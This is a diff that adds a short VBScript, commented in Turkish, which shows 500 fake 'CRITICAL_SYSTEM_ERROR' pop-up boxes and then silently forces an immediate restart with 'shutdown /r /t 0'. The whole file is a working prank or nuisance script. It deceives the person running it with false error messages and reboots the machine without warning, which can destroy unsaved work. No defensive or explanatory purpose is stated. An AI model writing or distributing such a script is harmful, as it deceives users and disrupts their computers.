@@ -1,0 +1,9 @@
+Dim i
+' 500 kere hata kutusu gösterir
+For i = 1 To 500
+    MsgBox "CRITICAL_SYSTEM_ERROR: Hata kodu " & i, 16, "Sistem Hatası"
+Next
+
+' Hata kutuları bittiğinde bilgisayarı anında yeniden başlatır
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "shutdown /r /t 0", 0, True
